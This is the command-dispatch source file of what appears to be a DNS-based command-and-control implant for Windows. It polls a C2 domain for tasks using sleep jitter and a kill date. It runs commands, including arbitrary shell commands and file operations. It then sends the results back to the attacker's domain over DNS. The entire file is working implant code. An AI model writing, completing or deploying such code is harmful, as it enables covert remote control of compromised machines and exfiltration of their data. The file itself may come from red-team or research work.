/**
 * Command.c - Command dispatch for DNS C2 Agent
 */

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "../include/Command.h"
#include "../include/Utils.h"
#include "../include/Transport.h"
#include "../include/Config.h"

// cabeceras de handlers
#include "../include/cd.h"
#include "../include/ls.h"
#include "../include/cp.h"
#include "../include/whoami.h"
#include "../include/mkdir.h"
#include "../include/pwd.h"
#include "../include/sleep.h"
#include "../include/shell.h"
#include "../include/exit.h"

// parsear "name args..."
static BOOL parse_command_str(const char* command_str, char** name, char** args) {
    if (!command_str || !name || !args) return FALSE;
    const char* space = strchr(command_str, ' ');
    if (!space) {
        *name = _strdup(command_str);
        *args = _strdup("");
    } else {
        size_t nlen = space - command_str;
        *name = malloc(nlen + 1);
        if (!*name) return FALSE;
        strncpy_s(*name, nlen + 1, command_str, nlen);
        (*name)[nlen] = '\0';
        *args = _strdup(space + 1);
    }
    return (*name != NULL && *args != NULL);
}

// despachar un único comando
BOOL execute_command(const char* command_str, char** output) {
    if (!command_str || !output) return FALSE;
    char* name = NULL;
    char* args = NULL;
    if (!parse_command_str(command_str, &name, &args)) {
        free(name);
        free(args);
        return FALSE;
    }

    char* result = NULL;
    BOOL ok = FALSE;
    if (strcmp(name, "cd") == 0) {
        result = cmd_cd(args); ok = TRUE;
    } else if (strcmp(name, "ls") == 0) {
        result = cmd_ls(args); ok = TRUE;
    } else if (strcmp(name, "cp") == 0) {
        result = cmd_cp(args); ok = TRUE;
    } else if (strcmp(name, "whoami") == 0) {
        result = cmd_whoami(args); ok = TRUE;
    } else if (strcmp(name, "mkdir") == 0) {
        result = cmd_mkdir(args); ok = TRUE;
    } else if (strcmp(name, "pwd") == 0) {
        result = cmd_pwd(args); ok = TRUE;
    } else if (strcmp(name, "sleep") == 0) {
        result = cmd_sleep(args); ok = TRUE;
    } else if (strcmp(name, "shell") == 0) {
        result = cmd_shell(args); ok = TRUE;
    } else if (strcmp(name, "exit") == 0) {
        result = cmd_exit(args); ok = TRUE;
    } else {
        size_t len = strlen(name) + 32;
        result = malloc(len);
        if (result) snprintf(result, len, "Unknown command: %s", name);
        ok = FALSE;
    }

    free(name);
    free(args);

    if (!result) {
        *output = _strdup("Error: Handler failed or returned NULL");
        return FALSE;
    }
    *output = result;
    return ok;
}

/**
 * command_loop: pide tareas, las ejecuta y devuelve resultados.
 */
int command_loop(void) {
    // inicializar semilla para el jitter
    srand((unsigned)time(NULL));

    while (TRUE) {
        // comprobar kill date
        if (is_kill_date_passed()) break;

        // dormir el intervalo con jitter
        DWORD interval = apply_jitter(get_sleep_interval(),
                                      get_jitter_percentage());
#if DEBUG_MODE
        printf("[DEBUG] Sleeping for %lu ms\n", (unsigned long)interval);
#endif
        Sleep(interval);

        // pedir tarea al servidor
        char* raw = dns_request_command(get_agent_uuid(),
                                        get_c2_domain());
        if (!raw) continue;
        if (*raw == '\0') { free(raw); continue; }

        // separar posible task_id del comando ("id:cmd")
        char* task_id = NULL;
        char* cmd_str = NULL;
        char* colon   = strchr(raw, ':');
        if (colon) {
            size_t idlen = colon - raw;
            task_id = malloc(idlen + 1);
            if (task_id) {
                strncpy_s(task_id, idlen + 1, raw, idlen);
                task_id[idlen] = '\0';
            }
            cmd_str = _strdup(colon + 1);
        } else {
            task_id = _strdup("0");
            cmd_str  = _strdup(raw);
        }
        free(raw);
        if (!cmd_str) {
            free(task_id);
            continue;
        }

        // ejecutar la orden
        char* result = NULL;
        BOOL ok = execute_command(cmd_str, &result);

        // si era "exit", salimos
        if (ok && strcmp(cmd_str, "exit") == 0) {
            free(cmd_str);
            free(task_id);
            if (result) free(result);
            break;
        }
        free(cmd_str);

        // enviar el resultado (si no es NULL)
        if (result) {
            // DEBUG: mostrar antes de enviar
            printf("[DEBUG] Task ID: %s\n", task_id);
            printf("[DEBUG] Command output:\n%s\n", result);

            BOOL sent = dns_send_result(get_agent_uuid(),
                                        task_id,
                                        result,
                                        get_c2_domain());
            printf("[DEBUG] dns_send_result returned: %s\n",
                   sent ? "TRUE" : "FALSE");

            free(result);
        }
        free(task_id);
    }

    return 0;
}
